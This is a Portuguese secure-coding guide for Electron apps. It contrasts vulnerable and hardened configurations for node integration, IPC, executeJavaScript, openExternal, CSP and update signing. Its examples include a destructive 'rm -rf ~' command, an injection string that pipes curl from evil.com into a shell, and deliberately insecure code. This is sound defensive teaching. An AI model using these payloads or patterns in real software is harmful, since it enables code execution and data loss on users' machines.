# Electron — Segurança

> Apps desktop com Chromium + Node.js. Lente: **renderer process não é confiável** mesmo no teu próprio app — qualquer XSS no renderer vira RCE local se nodeIntegration estiver ligado.

## Quando carregar

- `package.json` com `electron` em `dependencies` ou `devDependencies`
- `electron-builder.yml` / `electron.config.js`
- `main.js` ou `main/index.js` com `BrowserWindow`

## Mindset

- **Renderer = browser tab num app local** — pode aceder a APIs Node se mal configurado
- **IPC entre main e renderer** = canal de privilege escalation se sem validação
- **Updates via electron-updater** — vetor de supply chain
- **Local files** servidos com `file://` têm same-origin policy diferente
- **Auto-launch / system permissions** = malware-like se mal usados

## 7 categorias críticas

### 1. nodeIntegration: true (clássico catastrófico)

**BAD** — `main.js`:
```javascript
const win = new BrowserWindow({
  webPreferences: {
    nodeIntegration: true,
    contextIsolation: false
  }
});
win.loadURL('https://meu-app-web.com');
```

Qualquer XSS na página → `require('child_process').exec('rm -rf ~')` no PC do user.

**GOOD** — Electron defaults seguros (Electron 12+):
```javascript
const win = new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,        // default
    contextIsolation: true,        // default
    sandbox: true,                 // habilita Chromium sandbox
    preload: path.join(__dirname, 'preload.js')
  }
});
```

### 2. contextIsolation: false

Sem isolation, scripts da página partilham `window` com o preload. Ataque pode reescrever funções expostas.

**BAD** — `preload.js`:
```javascript
const { ipcRenderer } = require('electron');
window.api = {
  saveFile: (path, data) => ipcRenderer.invoke('save-file', path, data)
};
```

**GOOD** — usar `contextBridge`:
```javascript
const { contextBridge, ipcRenderer } = require('electron');
contextBridge.exposeInMainWorld('api', {
  saveFile: (path, data) => {
    if (typeof path !== 'string' || !path.endsWith('.txt')) {
      throw new Error('Invalid path');
    }
    return ipcRenderer.invoke('save-file', path, data);
  }
});
```

`contextBridge` cria um proxy seguro entre worlds isolados.

### 3. IPC handlers sem validação

**BAD** — `main.js`:
```javascript
ipcMain.handle('save-file', async (event, path, data) => {
  return fs.writeFileSync(path, data);
});
```

Renderer comprometido escreve em qualquer path do sistema (`/etc/passwd`, `~/.ssh/authorized_keys`).

**GOOD** — validar caminho dentro de userData:
```javascript
const { app } = require('electron');
const path = require('path');
const fs = require('fs/promises');

const userDataDir = app.getPath('userData');

ipcMain.handle('save-file', async (event, filename, data) => {
  if (typeof filename !== 'string' || filename.includes('..') || filename.includes('/')) {
    throw new Error('Invalid filename');
  }
  const safePath = path.join(userDataDir, 'docs', filename);
  await fs.writeFile(safePath, data, { flag: 'wx' });  // wx = exclusive
  return safePath;
});
```

### 4. webContents.executeJavaScript com input externo

**BAD**:
```javascript
win.webContents.executeJavaScript(`document.title = '${userInput}'`);
```

Se `userInput` for `'; require('child_process').exec('curl evil.com | sh')//`, pwn.

**GOOD** — usar IPC com dados serializados, nunca interpolar:
```javascript
ipcMain.handle('set-title', (event, title) => {
  win.setTitle(title);  // API do main, não JS no renderer
});
```

### 5. shell.openExternal sem validação

**BAD**:
```javascript
ipcMain.on('open-link', (event, url) => {
  shell.openExternal(url);
});
```

Atacante envia `file:///...` ou `vbscript:...` — pode executar binários locais.

**GOOD** — whitelist de schemes:
```javascript
ipcMain.on('open-link', (event, url) => {
  try {
    const u = new URL(url);
    if (u.protocol !== 'https:' && u.protocol !== 'http:') {
      return;
    }
    shell.openExternal(url);
  } catch {
    return;
  }
});
```

### 6. Carregar conteúdo remoto sem CSP

**BAD**:
```javascript
win.loadURL('https://web-app-externa.com');
// Sem CSP, sem allowlist de origins
```

**GOOD** — só carregar conteúdo local + CSP:
```javascript
win.loadFile('renderer/index.html');

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  callback({
    responseHeaders: {
      ...details.responseHeaders,
      'Content-Security-Policy': ["default-src 'self'; script-src 'self'"]
    }
  });
});
```

E bloquear navegação não autorizada:
```javascript
win.webContents.on('will-navigate', (event, url) => {
  if (!url.startsWith('file://')) event.preventDefault();
});
```

### 7. Auto-update sem signing verification

**BAD** — usar electron-updater apontando para servidor HTTP custom sem verificação:
```yaml
publish:
  provider: generic
  url: http://updates.meu-app.com/
```

**GOOD** — HTTPS + code signing:
```yaml
publish:
  provider: github
  owner: minha-org
  repo: meu-app
# code signing certs configurados em electron-builder
```

E verificar updateInfo signature antes de aplicar.

## Quick wins

- [ ] `nodeIntegration: false` em todos os BrowserWindow
- [ ] `contextIsolation: true`
- [ ] `sandbox: true` (sempre que viável)
- [ ] `preload.js` usa `contextBridge`, sem `window.X = ...`
- [ ] Todos `ipcMain.handle` validam tipos e caminhos
- [ ] `shell.openExternal` whitelist de protocolos (https/http only)
- [ ] CSP estrita injetada via `webRequest.onHeadersReceived`
- [ ] `will-navigate` bloqueia navegação para URLs externos
- [ ] `webContents.openHandler` controlado (não `'allow'` cego)
- [ ] Auto-update via HTTPS + code signing (Apple Developer ID, Authenticode)
- [ ] Sem `eval`, `new Function`, `setTimeout(string)` no renderer
- [ ] DevTools desabilitados em produção (`win.webContents.openDevTools()` removido)
- [ ] Electron version recente (CVEs patched)

## Falsos positivos

- `nodeIntegration: false` mas legacy code com `require()` — verificar se preload bridge cobre
- `shell.openExternal` com URL de configuração (não user input) — OK
- DevTools em modo dev — esperado, só importa em produção

## Severidade típica

- **Crítico** — `nodeIntegration: true` com qualquer XSS possível, IPC handler que escreve filesystem sem validar path
- **Alto** — `shell.openExternal` sem schema validation, `executeJavaScript` com input externo
- **Médio** — CSP fraca/ausente, auto-update sem HTTPS
- **Baixo** — DevTools em release, contextIsolation desnecessariamente off

## Cross-references

- [`tauri.md`](tauri.md) — alternativa Rust-based mais segura
- [`../linguagens/javascript-typescript.md`](../linguagens/javascript-typescript.md)
- [`../analises/19-injection-server-side.md`](../analises/19-injection-server-side.md) — RCE patterns
- [`../analises/16-headers-http.md`](../analises/16-headers-http.md) — CSP

## Recursos

- [Electron Security Tutorial](https://www.electronjs.org/docs/latest/tutorial/security)
- [Electronegativity](https://github.com/doyensec/electronegativity) — SAST tool específico
